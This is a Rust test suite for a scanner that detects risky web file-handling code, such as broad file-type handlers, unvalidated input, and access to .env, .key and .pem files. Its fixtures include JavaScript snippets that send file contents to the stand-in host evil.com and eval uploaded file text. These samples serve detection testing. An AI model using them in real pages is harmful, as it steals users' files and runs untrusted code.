use crate::file_handling_audit::*;

#[test]
fn no_file_handling_no_issues() {
    assert!(analyze_file_handling("<html><body>hello</body></html>").is_empty());
}

#[test]
fn detects_api_file_handlers() {
    let body = r#"{"file_handlers": [{"action": "/open", "accept": {"text/plain": [".txt"]}}]}"#;
    let issues = analyze_file_handling(body);
    assert!(issues.contains(&FileHandlingIssue::ApiDetected));
}

#[test]
fn detects_api_launch_queue_files() {
    let body = r#"<script>
        window.launchQueue.setConsumer(params => {
            for (const f of params.files) { readFile(f); }
        });
    </script>"#;
    let issues = analyze_file_handling(body);
    assert!(issues.contains(&FileHandlingIssue::ApiDetected));
}

#[test]
fn detects_broad_file_types() {
    let body = r#"{"file_handlers": [{"action": "/open", "accept": {"*/*": [".*"]}}]}"#;
    let issues = analyze_file_handling(body);
    assert!(issues.contains(&FileHandlingIssue::BroadFileTypes));
}

#[test]
fn no_broad_with_specific_type() {
    let body = r#"{"file_handlers": [{"action": "/open", "accept": {"text/plain": [".txt"]}}]}"#;
    let issues = analyze_file_handling(body);
    assert!(!issues.contains(&FileHandlingIssue::BroadFileTypes));
}

#[test]
fn detects_data_exfiltration() {
    let body = r#"<script>
        window.launchQueue.setConsumer(params => {
            for (const f of params.files) {
                fetch("/upload", {body: await f.text()});
            }
        });
    </script>"#;
    let issues = analyze_file_handling(body);
    assert!(issues.contains(&FileHandlingIssue::DataExfiltration));
}

#[test]
fn no_exfil_without_fetch() {
    let body = r#"<script>
        window.launchQueue.setConsumer(params => {
            for (const f of params.files) { console.log(f.name); }
        });
    </script>"#;
    let issues = analyze_file_handling(body);
    assert!(!issues.contains(&FileHandlingIssue::DataExfiltration));
}

#[test]
fn detects_no_content_validation() {
    let body = r#"<script>
        window.launchQueue.setConsumer(params => {
            for (const f of params.files) { processFile(f); }
        });
    </script>"#;
    let issues = analyze_file_handling(body);
    assert!(issues.contains(&FileHandlingIssue::NoContentValidation));
}

#[test]
fn no_validation_issue_with_type_check() {
    let body = r#"<script>
        window.launchQueue.setConsumer(params => {
            for (const f of params.files) {
                if (f.type === "text/plain") { processFile(f); }
            }
        });
    </script>"#;
    let issues = analyze_file_handling(body);
    assert!(!issues.contains(&FileHandlingIssue::NoContentValidation));
}

#[test]
fn detects_executable_handling() {
    let body =
        r#"{"file_handlers": [{"action": "/run", "accept": {"application/x-exe": [".exe"]}}]}"#;
    let issues = analyze_file_handling(body);
    assert!(issues.contains(&FileHandlingIssue::ExecutableHandling));
}

#[test]
fn no_executable_with_safe_types() {
    let body = r#"{"file_handlers": [{"action": "/open", "accept": {"text/plain": [".txt"]}}]}"#;
    let issues = analyze_file_handling(body);
    assert!(!issues.contains(&FileHandlingIssue::ExecutableHandling));
}

#[test]
fn severity_executable_highest() {
    assert_eq!(
        file_handling_severity(&FileHandlingIssue::ExecutableHandling),
        8.0
    );
}

#[test]
fn severity_detected_lowest() {
    assert_eq!(file_handling_severity(&FileHandlingIssue::ApiDetected), 2.5);
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![
        FileHandlingIssue::ApiDetected,
        FileHandlingIssue::BroadFileTypes,
    ];
    let mut seq = 0;
    let ops = file_handling_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(FileHandlingIssue::ApiDetected.to_string(), "api_detected");
    assert_eq!(
        FileHandlingIssue::BroadFileTypes.to_string(),
        "broad_file_types"
    );
    assert_eq!(
        FileHandlingIssue::DataExfiltration.to_string(),
        "data_exfiltration"
    );
    assert_eq!(
        FileHandlingIssue::NoContentValidation.to_string(),
        "no_content_validation"
    );
    assert_eq!(
        FileHandlingIssue::ExecutableHandling.to_string(),
        "executable_handling"
    );
}

#[test]
fn empty_body_no_issues() {
    assert!(analyze_file_handling("").is_empty());
}

// FileHandlingSecurityIssue tests

#[test]
pub fn security_empty_body_no_issues() {
    assert!(analyze_file_handling_security("").is_empty());
}

#[test]
pub fn security_no_file_keywords_no_issues() {
    let body = "<html><body><div>hello world</div></body></html>";
    assert!(analyze_file_handling_security(body).is_empty());
}

// FileDataExfiltration tests
#[test]
pub fn detects_file_data_exfiltration_with_filereader() {
    let body = r#"<script>
        const reader = new FileReader();
        reader.onload = () => {
            fetch("https://evil.com", {body: reader.result});
        };
    </script>"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.contains(&FileHandlingSecurityIssue::FileDataExfiltration));
}

#[test]
pub fn detects_file_data_exfiltration_with_text() {
    let body = r#"<script>
        const text = await file.text();
        fetch("/upload", {body: text});
    </script>"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.contains(&FileHandlingSecurityIssue::FileDataExfiltration));
}

#[test]
pub fn no_exfiltration_without_fetch() {
    let body = r#"<script>
        const reader = new FileReader();
        reader.onload = () => { console.log(reader.result); };
    </script>"#;
    let issues = analyze_file_handling_security(body);
    assert!(!issues.contains(&FileHandlingSecurityIssue::FileDataExfiltration));
}

// FileTypeBypass tests
#[test]
pub fn detects_file_type_bypass_exe() {
    let body = r#"{"accept": ".exe,.bat"}"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.contains(&FileHandlingSecurityIssue::FileTypeBypass));
}

#[test]
pub fn detects_file_type_bypass_ps1() {
    let body = r#"<input type="file" accept=".ps1">"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.contains(&FileHandlingSecurityIssue::FileTypeBypass));
}

#[test]
pub fn detects_file_type_bypass_sh() {
    let body = r#"<input type="file" accept=".sh">"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.contains(&FileHandlingSecurityIssue::FileTypeBypass));
}

#[test]
pub fn no_type_bypass_safe_extensions() {
    let body = r#"<input type="file" accept=".txt,.pdf">"#;
    let issues = analyze_file_handling_security(body);
    assert!(!issues.contains(&FileHandlingSecurityIssue::FileTypeBypass));
}

// FileWithoutValidation tests
#[test]
pub fn detects_file_without_validation_files_array() {
    let body = r#"<script>
        const f = input.files[0];
        processFile(f);
    </script>"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.contains(&FileHandlingSecurityIssue::FileWithoutValidation));
}

#[test]
pub fn detects_file_without_validation_launch_queue() {
    let body = r#"<script>
        launchQueue.setConsumer(params => {
            processFile(params.files[0]);
        });
    </script>"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.contains(&FileHandlingSecurityIssue::FileWithoutValidation));
}

#[test]
pub fn no_validation_issue_with_size_check() {
    let body = r#"<script>
        const f = input.files[0];
        if (f.size < 1000000) { processFile(f); }
    </script>"#;
    let issues = analyze_file_handling_security(body);
    assert!(!issues.contains(&FileHandlingSecurityIssue::FileWithoutValidation));
}

#[test]
pub fn no_validation_issue_with_type_validation() {
    let body = r#"<script>
        const f = input.files[0];
        if (f.type === "image/png") { processFile(f); }
    </script>"#;
    let issues = analyze_file_handling_security(body);
    assert!(!issues.contains(&FileHandlingSecurityIssue::FileWithoutValidation));
}

// FileCrossOrigin tests
#[test]
pub fn detects_file_cross_origin_postmessage() {
    let body = r#"<script>
        const reader = new FileReader();
        reader.onload = () => {
            window.parent.postMessage(reader.result, "*");
        };
    </script>"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.contains(&FileHandlingSecurityIssue::FileCrossOrigin));
}

#[test]
pub fn detects_file_cross_origin_message_channel() {
    let body = r#"<script>
        const text = await file.text();
        const channel = new MessageChannel();
        channel.port1.postMessage(text);
    </script>"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.contains(&FileHandlingSecurityIssue::FileCrossOrigin));
}

#[test]
pub fn no_cross_origin_without_postmessage() {
    let body = r#"<script>
        const reader = new FileReader();
        reader.onload = () => { console.log(reader.result); };
    </script>"#;
    let issues = analyze_file_handling_security(body);
    assert!(!issues.contains(&FileHandlingSecurityIssue::FileCrossOrigin));
}

// FileInBackground tests
#[test]
pub fn detects_file_in_background() {
    let body = r#"<script>
        document.addEventListener("visibilitychange", () => {
            const reader = new FileReader();
            reader.readAsText(file);
        });
    </script>"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.contains(&FileHandlingSecurityIssue::FileInBackground));
}

#[test]
pub fn detects_file_in_background_launch_queue() {
    let body = r#"<script>
        document.addEventListener("visibilitychange", () => {
            launchQueue.setConsumer(params => {});
        });
    </script>"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.contains(&FileHandlingSecurityIssue::FileInBackground));
}

#[test]
pub fn no_background_without_visibility() {
    let body = r#"<script>
        const reader = new FileReader();
        reader.readAsText(file);
    </script>"#;
    let issues = analyze_file_handling_security(body);
    assert!(!issues.contains(&FileHandlingSecurityIssue::FileInBackground));
}

// FilePersistentAccess tests
#[test]
pub fn detects_file_persistent_access_keep_existing() {
    let body = r#"<script>
        const handle = await showSaveFilePicker({keepExistingData: true});
    </script>"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.contains(&FileHandlingSecurityIssue::FilePersistentAccess));
}

#[test]
pub fn detects_file_persistent_access_indexeddb() {
    let body = r#"<script>
        const db = indexedDB.open("files");
        db.put({id: 1, FileHandle: handle});
    </script>"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.contains(&FileHandlingSecurityIssue::FilePersistentAccess));
}

#[test]
pub fn no_persistent_access_without_storage() {
    let body = r#"<script>
        const reader = new FileReader();
        reader.readAsText(file);
    </script>"#;
    let issues = analyze_file_handling_security(body);
    assert!(!issues.contains(&FileHandlingSecurityIssue::FilePersistentAccess));
}

// LargeFileDoS tests
#[test]
pub fn detects_large_file_dos_filereader() {
    let body = r#"<script>
        const reader = new FileReader();
        reader.readAsArrayBuffer(file);
    </script>"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.contains(&FileHandlingSecurityIssue::LargeFileDoS));
}

#[test]
pub fn detects_large_file_dos_arraybuffer() {
    let body = r#"<script>
        const buffer = await file.arrayBuffer();
    </script>"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.contains(&FileHandlingSecurityIssue::LargeFileDoS));
}

#[test]
pub fn no_dos_with_size_check() {
    let body = r#"<script>
        if (file.size < MAX_SIZE) {
            const reader = new FileReader();
            reader.readAsArrayBuffer(file);
        }
    </script>"#;
    let issues = analyze_file_handling_security(body);
    assert!(!issues.contains(&FileHandlingSecurityIssue::LargeFileDoS));
}

#[test]
pub fn no_dos_with_limit() {
    let body = r#"<script>
        const reader = new FileReader();
        if (file.size < limit) { reader.readAsText(file); }
    </script>"#;
    let issues = analyze_file_handling_security(body);
    assert!(!issues.contains(&FileHandlingSecurityIssue::LargeFileDoS));
}

// FileExecutionAttempt tests
#[test]
pub fn detects_file_execution_attempt_eval() {
    let body = r#"<script>
        const reader = new FileReader();
        reader.onload = () => {
            eval(reader.result);
        };
    </script>"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.contains(&FileHandlingSecurityIssue::FileExecutionAttempt));
}

#[test]
pub fn detects_file_execution_attempt_new_function() {
    let body = r#"<script>
        const text = await file.text();
        const fn = new Function(text);
        fn();
    </script>"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.contains(&FileHandlingSecurityIssue::FileExecutionAttempt));
}

#[test]
pub fn no_execution_without_eval() {
    let body = r#"<script>
        const reader = new FileReader();
        reader.onload = () => { console.log(reader.result); };
    </script>"#;
    let issues = analyze_file_handling_security(body);
    assert!(!issues.contains(&FileHandlingSecurityIssue::FileExecutionAttempt));
}

// SensitiveFileAccess tests
#[test]
pub fn detects_sensitive_file_access_env() {
    let body = r#"<input type="file" accept=".env">"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.contains(&FileHandlingSecurityIssue::SensitiveFileAccess));
}

#[test]
pub fn detects_sensitive_file_access_key() {
    let body = r#"<input type="file" accept=".key">"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.contains(&FileHandlingSecurityIssue::SensitiveFileAccess));
}

#[test]
pub fn detects_sensitive_file_access_pem() {
    let body = r#"const files = ["cert.pem", "key.pem"];"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.contains(&FileHandlingSecurityIssue::SensitiveFileAccess));
}

#[test]
pub fn detects_sensitive_file_access_config() {
    let body = r#"const configFile = "config.json";"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.contains(&FileHandlingSecurityIssue::SensitiveFileAccess));
}

#[test]
pub fn detects_sensitive_file_access_private() {
    let body = r#"<input type="file" id="private-key-upload">"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.contains(&FileHandlingSecurityIssue::SensitiveFileAccess));
}

#[test]
pub fn no_sensitive_access_safe_files() {
    let body = r#"<input type="file" accept=".txt,.pdf">"#;
    let issues = analyze_file_handling_security(body);
    assert!(!issues.contains(&FileHandlingSecurityIssue::SensitiveFileAccess));
}

// FileHandlerRegistration tests
#[test]
pub fn detects_file_handler_registration_key() {
    let body =
        r#"{"file_handlers": [{"action": "/open", "accept": {".key": ["application/x-key"]}}]}"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.contains(&FileHandlingSecurityIssue::FileHandlerRegistration));
}

#[test]
pub fn detects_file_handler_registration_pem() {
    let body =
        r#"{"file_handlers": [{"action": "/open", "accept": {".pem": ["application/x-pem"]}}]}"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.contains(&FileHandlingSecurityIssue::FileHandlerRegistration));
}

#[test]
pub fn detects_file_handler_registration_env() {
    let body = r#"{"file_handlers": [{"action": "/open", "accept": {".env": ["text/plain"]}}]}"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.contains(&FileHandlingSecurityIssue::FileHandlerRegistration));
}

#[test]
pub fn no_handler_registration_safe_types() {
    let body = r#"{"file_handlers": [{"action": "/open", "accept": {".txt": ["text/plain"]}}]}"#;
    let issues = analyze_file_handling_security(body);
    assert!(!issues.contains(&FileHandlingSecurityIssue::FileHandlerRegistration));
}

#[test]
pub fn no_handler_registration_without_file_handlers() {
    let body = r#"<input type="file" accept=".key">"#;
    let issues = analyze_file_handling_security(body);
    assert!(!issues.contains(&FileHandlingSecurityIssue::FileHandlerRegistration));
}

// Display tests
#[test]
pub fn security_display_variants() {
    assert_eq!(
        FileHandlingSecurityIssue::FileDataExfiltration.to_string(),
        "file_data_exfiltration"
    );
    assert_eq!(
        FileHandlingSecurityIssue::FileTypeBypass.to_string(),
        "file_type_bypass"
    );
    assert_eq!(
        FileHandlingSecurityIssue::FileWithoutValidation.to_string(),
        "file_without_validation"
    );
    assert_eq!(
        FileHandlingSecurityIssue::FileCrossOrigin.to_string(),
        "file_cross_origin"
    );
    assert_eq!(
        FileHandlingSecurityIssue::FileInBackground.to_string(),
        "file_in_background"
    );
    assert_eq!(
        FileHandlingSecurityIssue::FilePersistentAccess.to_string(),
        "file_persistent_access"
    );
    assert_eq!(
        FileHandlingSecurityIssue::LargeFileDoS.to_string(),
        "large_file_dos"
    );
    assert_eq!(
        FileHandlingSecurityIssue::FileExecutionAttempt.to_string(),
        "file_execution_attempt"
    );
    assert_eq!(
        FileHandlingSecurityIssue::SensitiveFileAccess.to_string(),
        "sensitive_file_access"
    );
    assert_eq!(
        FileHandlingSecurityIssue::FileHandlerRegistration.to_string(),
        "file_handler_registration"
    );
}

// Severity tests
#[test]
pub fn security_severity_file_execution_highest() {
    assert_eq!(
        file_handling_security_severity(&FileHandlingSecurityIssue::FileExecutionAttempt),
        9.0
    );
}

#[test]
pub fn security_severity_data_exfiltration() {
    assert_eq!(
        file_handling_security_severity(&FileHandlingSecurityIssue::FileDataExfiltration),
        8.5
    );
}

#[test]
pub fn security_severity_without_validation_lowest() {
    assert_eq!(
        file_handling_security_severity(&FileHandlingSecurityIssue::FileWithoutValidation),
        4.5
    );
}

#[test]
pub fn security_severity_all_in_range() {
    let variants = vec![
        FileHandlingSecurityIssue::FileDataExfiltration,
        FileHandlingSecurityIssue::FileTypeBypass,
        FileHandlingSecurityIssue::FileWithoutValidation,
        FileHandlingSecurityIssue::FileCrossOrigin,
        FileHandlingSecurityIssue::FileInBackground,
        FileHandlingSecurityIssue::FilePersistentAccess,
        FileHandlingSecurityIssue::LargeFileDoS,
        FileHandlingSecurityIssue::FileExecutionAttempt,
        FileHandlingSecurityIssue::SensitiveFileAccess,
        FileHandlingSecurityIssue::FileHandlerRegistration,
    ];
    for variant in variants {
        let severity = file_handling_security_severity(&variant);
        assert!(severity >= 3.0 && severity <= 9.0);
    }
}

// Operations tests
#[test]
pub fn security_to_operations_creates_entries() {
    let issues = vec![
        FileHandlingSecurityIssue::FileDataExfiltration,
        FileHandlingSecurityIssue::FileTypeBypass,
    ];
    let mut seq = 0;
    let ops = file_handling_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
pub fn security_to_operations_empty() {
    let issues = vec![];
    let mut seq = 0;
    let ops = file_handling_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 0);
    assert_eq!(seq, 0);
}

#[test]
pub fn security_to_operations_increments_seq() {
    let issues = vec![
        FileHandlingSecurityIssue::FileExecutionAttempt,
        FileHandlingSecurityIssue::SensitiveFileAccess,
        FileHandlingSecurityIssue::FileCrossOrigin,
    ];
    let mut seq = 10;
    let ops = file_handling_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 3);
    assert_eq!(seq, 13);
}

// Multiple issues test
#[test]
pub fn security_detects_multiple_issues() {
    let body = r#"<script>
        document.addEventListener("visibilitychange", () => {
            const reader = new FileReader();
            reader.onload = async () => {
                const text = await file.text();
                eval(text);
                fetch("https://evil.com", {body: text});
            };
        });
    </script>"#;
    let issues = analyze_file_handling_security(body);
    assert!(issues.len() >= 3);
    assert!(issues.contains(&FileHandlingSecurityIssue::FileExecutionAttempt));
    assert!(issues.contains(&FileHandlingSecurityIssue::FileDataExfiltration));
    assert!(issues.contains(&FileHandlingSecurityIssue::FileInBackground));
}
